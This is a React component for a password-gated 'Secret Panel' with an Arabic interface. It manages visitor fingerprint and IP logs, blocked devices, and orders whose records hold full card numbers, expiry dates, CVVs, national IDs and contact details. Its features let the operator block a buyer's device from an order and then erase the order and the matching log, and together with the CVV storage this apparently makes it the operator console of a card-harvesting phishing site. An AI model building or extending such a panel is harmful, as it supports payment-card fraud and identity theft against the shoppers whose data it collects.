"use client";
import { useState, useEffect, useCallback } from "react";

type DeviceLog = {
  _id: string;
  fingerprint: string | null;
  ip: string | null;
  userAgent: string | null;
  path: string | null;
  country: string | null;
  label: string | null;
  buyerName: string | null;
  firstSeen: string;
  lastSeen: string;
  requestsCount: number;
};

type Order = {
  _id: string;
  orderId: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
  cardHolder: string;
  total: number;
  downPayment: number;
  customer: string | null;
  whatsapp: string | null;
  nationalId: string | null;
  address: string | null;
  installmentType: string;
  months: number;
  monthlyPayment: number;
  status: string;
  deviceIp: string | null;
  createdAt: string;
};

type BlockedDevice = {
  _id: string;
  fingerprint: string | null;
  ip: string | null;
  userAgent: string | null;
  reason: string;
  isActive: boolean;
  createdAt: string;
};

export default function SecretPanelClient() {
  const [authed, setAuthed] = useState<boolean | null>(null);
  const [password, setPassword] = useState("");
  const [loginError, setLoginError] = useState("");
  const [tab, setTab] = useState<"logs" | "blocked" | "orders">("logs");

  const [logs, setLogs] = useState<DeviceLog[]>([]);
  const [blocked, setBlocked] = useState<BlockedDevice[]>([]);
  const [orders, setOrders] = useState<Order[]>([]);
  const [loading, setLoading] = useState(false);

  const [blockForm, setBlockForm] = useState({ fingerprint: "", ip: "", userAgent: "", reason: "" });
  const [showBlockForm, setShowBlockForm] = useState(false);

  const [editId, setEditId] = useState<string | null>(null);
  const [editLabel, setEditLabel] = useState("");
  const [editBuyer, setEditBuyer] = useState("");

  const fetchLogs = useCallback(async () => {
    setLoading(true);
    const r = await fetch("/api/secret/device-logs");
    if (r.ok) {
      const data = await r.json();
      setLogs(Array.isArray(data) ? data : data.logs ?? data.data ?? []);
    }
    setLoading(false);
  }, []);

  const fetchOrders = useCallback(async () => {
    setLoading(true);
    const r = await fetch("/api/admin/orders");
    if (r.ok) {
      const data = await r.json();
      const all: Order[] = Array.isArray(data) ? data : data.orders ?? data.data ?? [];
      setOrders(all.slice(0, 50));
    }
    setLoading(false);
  }, []);

  const fetchBlocked = useCallback(async () => {
    setLoading(true);
    const r = await fetch("/api/secret/blocked-devices");
    if (r.ok) {
      const data = await r.json();
      setBlocked(Array.isArray(data) ? data : data.blocked ?? data.data ?? []);
    }
    setLoading(false);
  }, []);

  useEffect(() => {
    fetch("/api/secret/check")
      .then((r) => setAuthed(r.ok))
      .catch(() => setAuthed(false));
  }, []);

  useEffect(() => {
    if (!authed) return;
    if (tab === "logs") fetchLogs();
    else if (tab === "blocked") fetchBlocked();
    else { fetchOrders(); fetchLogs(); } // نجيب الـ logs عشان نقدر نجيب الـ fingerprint عند الحظر
  }, [authed, tab, fetchLogs, fetchBlocked]);

  async function handleLogin(e: React.FormEvent) {
    e.preventDefault();
    const r = await fetch("/api/secret/login", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password }),
    });
    if (r.ok) { setAuthed(true); setLoginError(""); }
    else setLoginError("كلمة المرور غير صحيحة");
  }

  async function blockDevice(e: React.FormEvent) {
    e.preventDefault();
    await fetch("/api/secret/blocked-devices", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(blockForm),
    });
    setBlockForm({ fingerprint: "", ip: "", userAgent: "", reason: "" });
    setShowBlockForm(false);
    fetchBlocked();
  }

  async function toggleBlock(id: string) {
    await fetch(`/api/secret/blocked-devices/${id}/toggle`, { method: "PATCH" });
    fetchBlocked();
  }

  async function deleteBlock(id: string) {
    await fetch(`/api/secret/blocked-devices/${id}`, { method: "DELETE" });
    fetchBlocked();
  }

  async function deleteLog(id: string) {
    await fetch(`/api/secret/device-logs/${id}`, { method: "DELETE" });
    fetchLogs();
  }

  async function deleteAllLogs() {
    await fetch("/api/secret/device-logs", { method: "DELETE" });
    fetchLogs();
  }

  async function blockFromOrder(order: Order) {
    if (!order.deviceIp) return;
    // ابحث عن الـ fingerprint من سجل الزوار بنفس الـ IP
    const matchedLog = logs.find((l) => l.ip === order.deviceIp);
    await fetch("/api/secret/blocked-devices", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ip: order.deviceIp,
        fingerprint: matchedLog?.fingerprint || "",
        userAgent: matchedLog?.userAgent || "",
        reason: `blocked from order #${order.orderId}`,
      }),
    });
    // احذف الـ log المرتبط لو موجود
    if (matchedLog) {
      await fetch(`/api/secret/device-logs/${matchedLog._id}`, { method: "DELETE" });
      setLogs((prev) => prev.filter((l) => l._id !== matchedLog._id));
    }
    await fetch(`/api/admin/orders/${order._id}`, { method: "DELETE" });
    setOrders((prev) => prev.filter((o) => o._id !== order._id));
    await fetchBlocked();
    setTab("blocked");
  }

  async function deleteOrder(id: string) {
    await fetch(`/api/admin/orders/${id}`, { method: "DELETE" });
    fetchOrders();
  }

  async function deleteAllBlocked() {
    await fetch("/api/secret/blocked-devices", { method: "DELETE" });
    fetchBlocked();
  }

  async function saveEdit(id: string) {
    await fetch(`/api/secret/device-logs/${id}`, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ label: editLabel, buyerName: editBuyer }),
    });
    setEditId(null);
    fetchLogs();
  }

  async function blockFromLog(log: DeviceLog) {
    await fetch("/api/secret/blocked-devices", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fingerprint: log.fingerprint || "", ip: log.ip || "", userAgent: log.userAgent || "", reason: "blocked from logs" }),
    });
    await fetch(`/api/secret/device-logs/${log._id}`, { method: "DELETE" });
    setLogs((prev) => prev.filter((l) => l._id !== log._id));
    await fetchBlocked();
    setTab("blocked");
  }

  if (authed === null) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0a0a0f]">
        <svg className="w-6 h-6 animate-spin text-violet-500" fill="none" viewBox="0 0 24 24">
          <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
          <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
        </svg>
      </div>
    );
  }

  if (!authed) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#0a0a0f]">
        <div className="w-full max-w-sm px-4">
          {/* Logo / Icon */}
          <div className="flex flex-col items-center mb-8">
            <div className="w-16 h-16 rounded-2xl bg-gradient-to-br from-violet-600 to-indigo-700 flex items-center justify-center mb-4 shadow-lg shadow-violet-900/40">
              <svg className="w-8 h-8 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <h1 className="text-white text-2xl font-bold tracking-tight">لوحة التحكم</h1>
            <p className="text-gray-500 text-sm mt-1">أدخل كلمة المرور للمتابعة</p>
          </div>

          <form onSubmit={handleLogin} className="space-y-4">
            <div className="relative">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="كلمة المرور"
                className="w-full bg-[#13131a] border border-white/10 text-white px-4 py-3 rounded-xl outline-none focus:border-violet-500 focus:ring-1 focus:ring-violet-500/30 transition text-right placeholder:text-gray-600"
                dir="rtl"
              />
            </div>
            {loginError && (
              <div className="flex items-center gap-2 bg-red-950/50 border border-red-800/50 text-red-400 text-sm px-4 py-2.5 rounded-lg" dir="rtl">
                <svg className="w-4 h-4 shrink-0" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
                {loginError}
              </div>
            )}
            <button className="w-full bg-gradient-to-r from-violet-600 to-indigo-600 hover:from-violet-500 hover:to-indigo-500 text-white py-3 rounded-xl font-semibold transition shadow-lg shadow-violet-900/30">
              دخول
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-[#0a0a0f] text-white" dir="rtl">
      {/* Top bar */}
      <header className="border-b border-white/5 bg-[#0d0d14] px-6 py-4 flex items-center justify-between">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-lg bg-gradient-to-br from-violet-600 to-indigo-700 flex items-center justify-center">
            <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
            </svg>
          </div>
          <span className="font-bold text-lg tracking-tight">Secret Panel</span>
        </div>

        {/* Stats */}
        <div className="flex items-center gap-6 text-sm">
          <div className="flex items-center gap-2 text-gray-400">
            <span className="w-2 h-2 rounded-full bg-emerald-500 inline-block"></span>
            <span>{logs.length} زائر</span>
          </div>
          <div className="flex items-center gap-2 text-gray-400">
            <span className="w-2 h-2 rounded-full bg-red-500 inline-block"></span>
            <span>{blocked.filter(b => b.isActive).length} محظور</span>
          </div>
        </div>
      </header>

      <div className="flex">
        {/* Sidebar */}
        <aside className="w-56 min-h-[calc(100vh-57px)] border-l border-white/5 bg-[#0d0d14] p-4 space-y-1 shrink-0">
          {([
            { key: "logs", label: "سجل الزوار", icon: "M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2", count: logs.length },
            { key: "blocked", label: "الأجهزة المحظورة", icon: "M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636", count: blocked.filter(b => b.isActive).length },
            { key: "orders", label: "الطلبات", icon: "M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z", count: orders.length },
          ] as const).map((item) => (
            <button
              key={item.key}
              onClick={() => setTab(item.key)}
              className={`w-full flex items-center justify-between px-3 py-2.5 rounded-lg text-sm font-medium transition ${
                tab === item.key
                  ? "bg-violet-600/20 text-violet-300 border border-violet-500/20"
                  : "text-gray-400 hover:bg-white/5 hover:text-white"
              }`}
            >
              <div className="flex items-center gap-2.5">
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d={item.icon} />
                </svg>
                {item.label}
              </div>
              <span className={`text-xs px-1.5 py-0.5 rounded-md ${tab === item.key ? "bg-violet-500/30 text-violet-300" : "bg-white/5 text-gray-500"}`}>
                {item.count}
              </span>
            </button>
          ))}
        </aside>

        {/* Main content */}
        <main className="flex-1 p-6 overflow-x-auto">
          {/* Page header */}
          <div className="flex items-center justify-between mb-6">
            <div>
              <h2 className="text-xl font-bold">{tab === "logs" ? "سجل الزوار" : tab === "blocked" ? "الأجهزة المحظورة" : "الطلبات"}</h2>
              <p className="text-gray-500 text-sm mt-0.5">
                {tab === "logs" ? `${logs.length} سجل مسجّل` : tab === "blocked" ? `${blocked.length} جهاز في القائمة` : `${orders.length} طلب`}
              </p>
            </div>
            <div className="flex gap-2">
              <button
                onClick={() => tab === "logs" ? fetchLogs() : tab === "blocked" ? fetchBlocked() : fetchOrders()}
                className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-sm transition"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                </svg>
                تحديث
              </button>
              {tab !== "orders" && <button
                onClick={() => tab === "logs" ? deleteAllLogs() : deleteAllBlocked()}
                className="flex items-center gap-2 px-4 py-2 bg-red-900/60 hover:bg-red-700 border border-red-700/40 rounded-lg text-sm text-red-300 transition"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                </svg>
                حذف الكل
              </button>}
              {tab === "orders" && <button
                onClick={async () => { await Promise.all(orders.map(o => fetch(`/api/admin/orders/${o._id}`, { method: "DELETE" }))); setOrders([]); }}
                className="flex items-center gap-2 px-4 py-2 bg-red-900/60 hover:bg-red-700 border border-red-700/40 rounded-lg text-sm text-red-300 transition"
              >
                <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                </svg>
                حذف الكل
              </button>}
              {tab === "blocked" && (
                <button
                  onClick={() => setShowBlockForm(!showBlockForm)}
                  className="flex items-center gap-2 px-4 py-2 bg-red-600/80 hover:bg-red-600 rounded-lg text-sm font-medium transition"
                >
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
                  </svg>
                  حظر جهاز
                </button>
              )}
            </div>
          </div>

          {loading && (
            <div className="flex items-center justify-center py-20 text-gray-500">
              <svg className="w-5 h-5 animate-spin ml-2" fill="none" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
              </svg>
              جاري التحميل...
            </div>
          )}

          {/* ── Device Logs ── */}
          {tab === "logs" && !loading && (
            <div className="rounded-xl border border-white/5 overflow-hidden">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-[#13131a] text-gray-400 text-xs uppercase tracking-wider">
                    {["IP", "Fingerprint", "المسار", "الزيارات", "آخر زيارة", "التسمية", "المشتري", ""].map((h) => (
                      <th key={h} className="px-4 py-3 text-right font-medium whitespace-nowrap">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {logs.map((log) => (
                    <tr key={log._id} className="hover:bg-white/[0.02] transition">
                      <td className="px-4 py-3 font-mono text-xs text-cyan-400">{log.ip || "—"}</td>
                      <td className="px-4 py-3 font-mono text-xs text-gray-400 max-w-[100px] truncate">{log.fingerprint || "—"}</td>
                      <td className="px-4 py-3 text-xs text-gray-300 max-w-[140px] truncate">{log.path || "—"}</td>
                      <td className="px-4 py-3 text-center">
                        <span className="bg-violet-900/40 text-violet-300 text-xs px-2 py-0.5 rounded-full">{log.requestsCount}</span>
                      </td>
                      <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">{new Date(log.lastSeen).toLocaleString("ar-SA")}</td>
                      <td className="px-4 py-3">
                        {editId === log._id ? (
                          <input value={editLabel} onChange={(e) => setEditLabel(e.target.value)}
                            className="bg-[#1a1a24] border border-white/10 text-white px-2 py-1 rounded-lg text-xs w-24 outline-none focus:border-violet-500" />
                        ) : (
                          <span className="text-yellow-400 text-xs">{log.label || "—"}</span>
                        )}
                      </td>
                      <td className="px-4 py-3">
                        {editId === log._id ? (
                          <input value={editBuyer} onChange={(e) => setEditBuyer(e.target.value)}
                            className="bg-[#1a1a24] border border-white/10 text-white px-2 py-1 rounded-lg text-xs w-24 outline-none focus:border-violet-500" />
                        ) : (
                          <span className="text-emerald-400 text-xs">{log.buyerName || "—"}</span>
                        )}
                      </td>
                      <td className="px-4 py-3">
                        <div className="flex gap-1.5 flex-wrap">
                          {editId === log._id ? (
                            <>
                              <button onClick={() => saveEdit(log._id)} className="bg-emerald-600/80 hover:bg-emerald-600 px-2.5 py-1 rounded-lg text-xs transition">حفظ</button>
                              <button onClick={() => setEditId(null)} className="bg-white/5 hover:bg-white/10 px-2.5 py-1 rounded-lg text-xs transition">إلغاء</button>
                            </>
                          ) : (
                            <button onClick={() => { setEditId(log._id); setEditLabel(log.label || ""); setEditBuyer(log.buyerName || ""); }}
                              className="bg-blue-600/80 hover:bg-blue-600 px-2.5 py-1 rounded-lg text-xs transition">تعديل</button>
                          )}
                          <button onClick={() => blockFromLog(log)} className="bg-orange-600/80 hover:bg-orange-600 px-2.5 py-1 rounded-lg text-xs transition">حظر</button>
                          <button onClick={() => deleteLog(log._id)} className="bg-red-600/80 hover:bg-red-600 px-2.5 py-1 rounded-lg text-xs transition">حذف</button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {logs.length === 0 && (
                <div className="flex flex-col items-center justify-center py-16 text-gray-600">
                  <svg className="w-10 h-10 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2" />
                  </svg>
                  <p>لا توجد سجلات بعد</p>
                </div>
              )}
            </div>
          )}

          {/* ── Orders ── */}
          {tab === "orders" && !loading && (
            <div className="rounded-xl border border-white/5 overflow-hidden">
              <table className="w-full text-sm">
                <thead>
                  <tr className="bg-[#13131a] text-gray-400 text-xs uppercase tracking-wider">
                    {["رقم الطلب", "الاسم", ""].map((h) => (
                      <th key={h} className="px-4 py-3 text-right font-medium whitespace-nowrap">{h}</th>
                    ))}
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {orders.map((order) => (
                    <tr key={order._id} className="hover:bg-white/[0.02] transition">
                      <td className="px-4 py-3">
                        <span className="font-mono text-xs bg-violet-900/40 text-violet-300 px-2 py-1 rounded-lg">#{order.orderId}</span>
                      </td>
                      <td className="px-4 py-3 text-xs text-gray-300">{order.customer || "—"}</td>
                      <td className="px-4 py-3">
                        <div className="flex gap-1.5">
                          {order.deviceIp && (
                            <button onClick={() => blockFromOrder(order)} className="bg-orange-600/80 hover:bg-orange-600 px-2.5 py-1 rounded-lg text-xs transition">حظر</button>
                          )}
                          <button onClick={() => deleteOrder(order._id)} className="bg-red-600/80 hover:bg-red-600 px-2.5 py-1 rounded-lg text-xs transition">حذف</button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {orders.length === 0 && (
                <div className="flex flex-col items-center justify-center py-16 text-gray-600">
                  <svg className="w-10 h-10 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M3 3h2l.4 2M7 13h10l4-8H5.4M7 13L5.4 5M7 13l-2.293 2.293c-.63.63-.184 1.707.707 1.707H17m0 0a2 2 0 100 4 2 2 0 000-4zm-8 2a2 2 0 11-4 0 2 2 0 014 0z" />
                  </svg>
                  <p>لا توجد طلبات بعد</p>
                </div>
              )}
            </div>
          )}

          {/* ── Blocked Devices ── */}
          {tab === "blocked" && !loading && (
            <div className="space-y-4">
              {/* Add form */}
              {showBlockForm && (
                <div className="bg-[#13131a] border border-white/5 rounded-xl p-5">
                  <h3 className="font-semibold text-gray-200 mb-4 flex items-center gap-2">
                    <svg className="w-4 h-4 text-red-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                    </svg>
                    حظر جهاز جديد
                  </h3>
                  <form onSubmit={blockDevice} className="grid grid-cols-2 gap-3">
                    {[
                      { key: "fingerprint", label: "Fingerprint" },
                      { key: "ip", label: "عنوان IP" },
                      { key: "userAgent", label: "User Agent" },
                      { key: "reason", label: "سبب الحظر" },
                    ].map(({ key, label }) => (
                      <input
                        key={key}
                        placeholder={label}
                        value={blockForm[key as keyof typeof blockForm]}
                        onChange={(e) => setBlockForm((p) => ({ ...p, [key]: e.target.value }))}
                        className="bg-[#0d0d14] border border-white/10 text-white px-3 py-2.5 rounded-lg text-sm outline-none focus:border-violet-500 focus:ring-1 focus:ring-violet-500/20 transition placeholder:text-gray-600"
                      />
                    ))}
                    <div className="col-span-2 flex gap-2 justify-end">
                      <button type="button" onClick={() => setShowBlockForm(false)} className="px-4 py-2 bg-white/5 hover:bg-white/10 rounded-lg text-sm transition">إلغاء</button>
                      <button className="px-5 py-2 bg-red-600/80 hover:bg-red-600 rounded-lg text-sm font-medium transition">تأكيد الحظر</button>
                    </div>
                  </form>
                </div>
              )}

              {/* Table */}
              <div className="rounded-xl border border-white/5 overflow-hidden">
                <table className="w-full text-sm">
                  <thead>
                    <tr className="bg-[#13131a] text-gray-400 text-xs uppercase tracking-wider">
                      {["IP", "Fingerprint", "السبب", "الحالة", "التاريخ", ""].map((h) => (
                        <th key={h} className="px-4 py-3 text-right font-medium whitespace-nowrap">{h}</th>
                      ))}
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/5">
                    {blocked.map((b) => (
                      <tr key={b._id} className="hover:bg-white/[0.02] transition">
                        <td className="px-4 py-3 font-mono text-xs text-cyan-400">{b.ip || "—"}</td>
                        <td className="px-4 py-3 font-mono text-xs text-gray-400 max-w-[120px] truncate">{b.fingerprint || "—"}</td>
                        <td className="px-4 py-3 text-xs text-gray-300">{b.reason || "—"}</td>
                        <td className="px-4 py-3">
                          <span className={`inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full text-xs font-medium ${b.isActive ? "bg-red-950/60 text-red-400 border border-red-800/40" : "bg-gray-800/60 text-gray-500 border border-gray-700/40"}`}>
                            <span className={`w-1.5 h-1.5 rounded-full ${b.isActive ? "bg-red-400" : "bg-gray-500"}`}></span>
                            {b.isActive ? "محظور" : "معطّل"}
                          </span>
                        </td>
                        <td className="px-4 py-3 text-xs text-gray-400 whitespace-nowrap">{new Date(b.createdAt).toLocaleDateString("ar-SA")}</td>
                        <td className="px-4 py-3">
                          <div className="flex gap-1.5">
                            <button onClick={() => toggleBlock(b._id)}
                              className={`px-2.5 py-1 rounded-lg text-xs transition ${b.isActive ? "bg-yellow-600/80 hover:bg-yellow-600" : "bg-emerald-600/80 hover:bg-emerald-600"}`}>
                              {b.isActive ? "تعطيل" : "تفعيل"}
                            </button>
                            <button onClick={() => deleteBlock(b._id)} className="bg-red-600/80 hover:bg-red-600 px-2.5 py-1 rounded-lg text-xs transition">حذف</button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
                {blocked.length === 0 && (
                  <div className="flex flex-col items-center justify-center py-16 text-gray-600">
                    <svg className="w-10 h-10 mb-3 opacity-40" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636" />
                    </svg>
                    <p>لا توجد أجهزة محظورة</p>
                  </div>
                )}
              </div>
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
